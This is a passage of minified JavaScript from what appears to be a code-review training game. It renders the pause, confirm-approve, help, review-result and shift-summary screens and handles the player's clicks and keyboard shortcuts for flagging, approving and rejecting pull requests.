            <span>Cite any line with <kbd>S</kbd> / <kbd>E</kbd> / <kbd>X</kbd>.</span>
          </div>
        </section>
      </div>
    `}renderPauseOverlay(){return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="pause-title">
        <section class="modal pause-modal">
          <div class="eyebrow">SHIFT CLOCK HALTED</div>
          <h2 id="pause-title" class="pause-title">PAUSED</h2>
          <p>The queue is holding. No SLAs are draining.</p>
          <button class="btn btn-primary" data-action="resume" data-autofocus>
            <span class="btn-key">P</span> RESUME SHIFT
          </button>
        </section>
      </div>
    `}renderModal(e){const t=e.modal;if(t===null)return"";if(t.type==="confirm-approve"){const c=w[t.prId],h=c===void 0?void 0:e.prs[c.id];return c===void 0||h===void 0?"":`
        <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="confirm-title">
          <section class="modal confirm-modal">
            <div class="eyebrow">MERGE OVERRIDE</div>
            <h2 id="confirm-title">UNRESOLVED FINDINGS</h2>
            <p>You have flagged <strong>${h.flags.length}</strong> violation${h.flags.length===1?"":"s"} on PR #${c.number}, but you are about to approve it.</p>
            <p class="warning-text">Approving will merge the code with your findings unresolved.</p>
            <div class="modal-actions">
              <button class="btn" data-action="dismiss-modal" data-autofocus>
                <span class="btn-key">ESC</span> CANCEL
              </button>
              <button class="btn btn-danger" data-action="confirm-approve">
                <span class="btn-key">ENTER</span> APPROVE ANYWAY
              </button>
            </div>
          </section>
        </div>
      `}if(t.type==="help")return`
        <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="help-title">
          <section class="modal help-modal">
            <div class="modal-head">
              <div>
                <div class="eyebrow">REVIEWER INTERFACE</div>
                <h2 id="help-title">CONTROLS</h2>
              </div>
              <button class="btn btn-quiet" data-action="dismiss-modal" data-autofocus>
                <span class="btn-key">ESC</span> CLOSE
              </button>
            </div>
            <div class="control-grid">${A()}</div>
            <div class="modal-foot">Mouse works too: click queue tabs, file tabs, lines, and actions.</div>
          </section>
        </section>
      `;const s=t.result,i=w[s.prId];if(i===void 0)return"";const a=s.verdict==="timeout"?"AUTO-REJECTED":s.verdict.toUpperCase(),l=s.correctAction?"is-good":"is-bad",r=s.securityIncident?"SECURITY INCIDENT LOGGED":s.qualityIncident?"QUALITY INCIDENT LOGGED":"",d=s.verdict==="timeout"?"SLA EXPIRED · CODE DID NOT SHIP":s.verdict==="approved"?s.correctAction?"CLEAN MERGE":"SHIPPED WITH DEFECTS":s.correctAction?"CHANGES REQUESTED":"FALSE ALARM",u=s.caught.map(c=>this.renderDefectRow(i,c,!0)).join(""),m=s.missed.map(c=>this.renderDefectRow(i,c,!1)).join(""),v=s.falseFlags.map(c=>this.renderFalseFlag(i,c)).join("");return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="verdict-title">
        <section class="modal verdict-modal">
          <div class="verdict-top">
            <div>
              <div class="eyebrow">PR #${i.number} · REVIEW RESULT</div>
              <h2 id="verdict-title">${o(i.title)}</h2>
              <p class="verdict-headline">${d}</p>
            </div>
            <div class="stamp ${l}">${a}</div>
          </div>

          <div class="verdict-stats">
            <div><span>SCORE</span><strong class="${s.scoreDelta>=0?"positive":"negative"}">${k(s.scoreDelta,!0)}</strong></div>
            <div><span>CAUGHT</span><strong>${s.caught.length}/${i.defects.length}</strong></div>
            <div><span>FALSE FLAGS</span><strong>${s.falseFlags.length}</strong></div>
            <div><span>TIME LEFT</span><strong>${b(s.remainingMs)}</strong></div>
          </div>

          ${r?`<div class="incident-banner">${r}</div>`:""}

          <div class="postmortem-grid">
            <div class="postmortem-block">
              <div class="panel-title">CAUGHT</div>
              ${u.length>0?u:'<div class="empty-copy">None.</div>'}
            </div>
            <div class="postmortem-block">
              <div class="panel-title">MISSED</div>
              ${m.length>0?m:'<div class="empty-copy">None.</div>'}
            </div>
            <div class="postmortem-block">
              <div class="panel-title">FALSE FLAGS</div>
              ${v.length>0?v:'<div class="empty-copy">None.</div>'}
            </div>
          </div>

          <div class="modal-actions">
            <button class="btn btn-primary" data-action="dismiss-modal" data-autofocus>
              <span class="btn-key">ENTER</span> ${t.final?"VIEW SHIFT REPORT":"CONTINUE QUEUE"}
            </button>
          </div>
        </section>
      </div>
    `}renderDefectRow(e,t,s){const i=this.defectLocations(e,t),a=x[t.guidelineId];return`
      <div class="defect-row ${s?"is-caught":"is-missed"}">
        <div class="defect-meta">
          <span class="guideline-id ${y(t.type)}">${t.guidelineId}</span>
          <span>${o(i)}</span>
        </div>
        <strong>${o(t.title)}</strong>
        <p>${o(t.explanation)}</p>
        ${a===void 0?"":`<span class="defect-rule">${o(a.title)}</span>`}
      </div>
    `}renderFalseFlag(e,t){const i=e.files.find(a=>a.path===t.filePath)?.lines.find(a=>a.id===t.lineId);return`
      <div class="defect-row is-false">
        <div class="defect-meta">
          <span class="guideline-id ${y(t.type)}">${$[t.type]}</span>
          <span>${o(S(t.filePath))}:${i?.newNo??"?"}</span>
        </div>
        <p>No matching violation at this location.</p>
      </div>
    `}defectLocations(e,t){return t.lineIds.map(s=>{const i=e.files.find(l=>l.lines.some(r=>r.id===s)),a=i?.lines.find(l=>l.id===s);return`${S(i?.path??"?")}:${a?.newNo??"?"}`}).join(" · ")}renderSummary(){const e=this.game.state,t=V(e.score,e.metrics),s=e.results.filter(l=>l.correctAction).length,i=e.results.filter(l=>l.securityIncident||l.qualityIncident).length,a=f.map(l=>{const r=e.results.find(v=>v.prId===l.id);if(r===void 0)return"";const d=l.defects.length,u=d===0?r.verdict==="approved"?"CLEAN APPROVAL":"CLEAN PR BLOCKED":`CAUGHT ${r.caught.length}/${d} · FALSE ${r.falseFlags.length}`,m=r.correctAction?"is-good":r.verdict==="timeout"?"is-warn":"is-bad";return`
        <div class="result-row">
          <div class="result-pr">
            <span>#${l.number}</span>
            <strong>${o(l.title)}</strong>
            <small>${o(l.author)}</small>
          </div>
          <div class="result-verdict ${m}">${se(r)}</div>
          <div class="result-review">${u}</div>
          <div class="result-score ${r.scoreDelta>=0?"positive":"negative"}">${k(r.scoreDelta,!0)}</div>
        </div>
      `}).join("");return`
      <main class="summary-screen">
        <section class="summary-card panel">
          <div class="eyebrow">SHIFT 01 / COMPLETE · PERFORMANCE REVIEW</div>
          <div class="summary-hero">
            <div>
              <h1>${t.label}</h1>
              <p>${o(t.caption)}</p>
            </div>
            <div class="summary-score">
              <span>FINAL SCORE</span>
              <strong>${k(e.score,!0)}</strong>
            </div>
          </div>

          <div class="summary-metrics">
            ${I("QUALITY",e.metrics.quality)}
            ${I("SECURITY",e.metrics.security)}
            ${I("THROUGHPUT",e.metrics.throughput)}
          </div>

          <div class="summary-totals">
            <span>CORRECT DECISIONS <strong>${s}/${e.results.length}</strong></span>
            <span>INCIDENTS <strong class="${i>0?"negative":"positive"}">${i}</strong></span>
            <span>SHIFT TIME <strong>${b(e.elapsedMs)}</strong></span>
          </div>

          <div class="results-table">
            <div class="result-row result-header">
              <span>PULL REQUEST</span>
              <span>OUTCOME</span>
              <span>REVIEW QUALITY</span>
              <span>POINTS</span>
            </div>
            ${a}
          </div>

          <div class="summary-actions">
            <button class="btn btn-primary btn-large" data-action="replay" data-autofocus>
              <span class="btn-key">ENTER</span> REPLAY SHIFT
            </button>
            <span class="summary-note">The queue does not stop for you.</span>
          </div>
        </section>
      </main>
    `}tickClocks(){const e=this.game.state;if(e.screen==="shift")for(const t of f){const s=e.prs[t.id],i=this.root.querySelector(`[data-clock="${t.id}"]`),a=this.queueClock(e,t,s);i!==null&&(i.textContent=a.label,i.closest(".queue-tab")?.classList.toggle("is-critical",a.critical));const l=this.root.querySelector(`[data-sla-time="${t.id}"]`),r=this.root.querySelector(`[data-sla-block="${t.id}"]`),d=this.root.querySelector(`[data-sla-meter="${t.id}"]`);if(s.status==="available"&&l!==null&&r!==null&&d!==null){const u=N(e,t);l.textContent=b(u),r.classList.toggle("is-critical",u<=3e4),d.style.width=`${Math.max(0,Math.min(100,u/t.slaMs*100))}%`}}}handleClick=e=>{const t=e.target;if(!(t instanceof Element))return;const s=t.closest("[data-action]");if(s===null)return;const i=s.dataset.action;if(i!==void 0)switch(e.preventDefault(),i){case"start":this.revealCursorNext=!0,this.game.startShift();break;case"select-pr":{if(s instanceof HTMLButtonElement&&s.disabled)return;const a=s.dataset.prId;a!==void 0&&(this.revealCursorNext=!0,this.game.selectPR(a));break}case"select-file":{const a=Number(s.dataset.fileIndex);Number.isFinite(a)&&(this.revealCursorNext=!0,this.game.selectFile(a));break}case"select-line":{const a=s.dataset.lineId;a!==void 0&&this.game.selectLine(a);break}case"flag":{const a=s.dataset.flagType;(a==="STYLE"||a==="ERROR"||a==="SECURITY")&&this.game.toggleFlag(a);break}case"clear-line":this.game.clearLineFlags();break;case"approve":this.game.approve();break;case"reject":this.game.reject();break;case"confirm-approve":this.game.confirmApprove();break;case"pause":this.game.togglePause();break;case"resume":this.game.togglePause();break;case"guidelines":this.game.toggleGuidelines();break;case"close-guidelines":this.game.closeGuidelines();break;case"dismiss-modal":this.game.dismissModal();break;case"replay":this.revealCursorNext=!0,this.game.replay();break;case"help":this.game.openHelp();break}};handleKeyDown=e=>{if(e.metaKey||e.ctrlKey||e.altKey)return;const t=e.key.toLowerCase(),s=this.game.state;if(s.modal!==null){if(s.modal.type==="confirm-approve"){t==="enter"?(e.preventDefault(),this.game.confirmApprove()):t==="escape"&&(e.preventDefault(),this.game.dismissModal());return}(t==="enter"||t===" "||t==="escape")&&(e.preventDefault(),this.game.dismissModal());return}if(s.screen==="title"){if(s.guidelinesOpen){(t==="escape"||t==="g")&&(e.preventDefault(),this.game.closeGuidelines());return}t==="enter"||t===" "?(e.preventDefault(),this.revealCursorNext=!0,this.game.startShift()):t==="g"?(e.preventDefault(),this.game.toggleGuidelines()):t==="?"&&(e.preventDefault(),this.game.openHelp());return}if(s.screen==="summary"){t==="enter"||t==="r"?(e.preventDefault(),this.revealCursorNext=!0,this.game.replay()):t==="?"&&(e.preventDefault(),this.game.openHelp());return}if(s.guidelinesOpen){(t==="escape"||t==="g")&&(e.preventDefault(),this.game.closeGuidelines());return}if(s.paused){(t==="p"||t==="escape")&&(e.preventDefault(),this.game.togglePause());return}if(!(e.repeat&&["a","r","s","e","x","g","p","?","[","]","tab","1","2","3","4"].includes(t)))switch(t){case"arrowup":case"k":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(-1);break;case"arrowdown":case"j":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(1);break;case"pageup":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(-10);break;case"pagedown":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(10);break;case"home":e.preventDefault(),this.revealCursorNext=!0,this.game.jumpCursor("home");break;case"end":e.preventDefault(),this.revealCursorNext=!0,this.game.jumpCursor("end");break;case"tab":e.preventDefault(),this.revealCursorNext=!0,this.game.cyclePR(e.shiftKey?-1:1);break;case"1":case"2":case"3":case"4":{e.preventDefault();const i=f[Number(t)-1];if(i!==void 0){const a=s.prs[i.id];a.status==="available"?(this.revealCursorNext=!0,this.game.selectPR(i.id)):a.status==="waiting"&&(this.game.addLog(`PR #${i.number} is still inbound.`,"warning"),this.render())}break}case"[":e.preventDefault(),this.revealCursorNext=!0,this.game.cycleFile(-1);break;case"]":e.preventDefault(),this.revealCursorNext=!0,this.game.cycleFile(1);break;case"s":e.preventDefault(),this.game.toggleFlag("STYLE");break;case"e":e.preventDefault(),this.game.toggleFlag("ERROR");break;case"x":e.preventDefault(),this.game.toggleFlag("SECURITY");break;case"backspace":case"delete":e.preventDefault(),this.game.clearLineFlags();break;case"a":e.preventDefault(),this.game.approve();break;case"r":e.preventDefault(),this.game.reject();break;case"g":e.preventDefault(),this.game.toggleGuidelines();break;case"p":e.preventDefault(),this.game.togglePause();break;case"?":case"h":e.preventDefault(),this.game.openHelp();break}};handleVisibilityChange=()=>{const e=this.game.state;document.hidden&&e.screen==="shift"&&!e.paused&&e.modal===null&&this.game.togglePause()}}const O=document.querySelector("#app");if(O===null)throw new Error("Missing #app mount point");new ie(O);
